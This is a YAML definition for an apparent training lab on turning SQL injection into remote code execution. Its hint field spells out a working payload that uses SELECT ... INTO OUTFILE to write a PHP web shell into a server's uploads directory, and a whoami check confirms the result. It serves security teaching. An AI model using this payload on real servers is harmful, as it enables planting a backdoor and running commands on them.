#The "SQLi to RCE" Lab (ID: study-sqli-shell)
​Learning Objective: An advanced lab showing how a simple SQL injection can be used to write a "Web Shell" to the server and execute OS commands.
# Add your .study YAML here

id: study-sqli-shell
info:
  name: "SQL Injection to Web Shell"
  severity: critical

environment:
  docker: "hackeracademy/labs-mysql-rce:latest"

scenario:
  mission: "Use UNION SELECT to write a PHP shell to the /var/www/html/uploads/ directory."
  hint: "SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php'"

validation:
  type: rce
  command: "whoami"
  expected_output: "www-data"
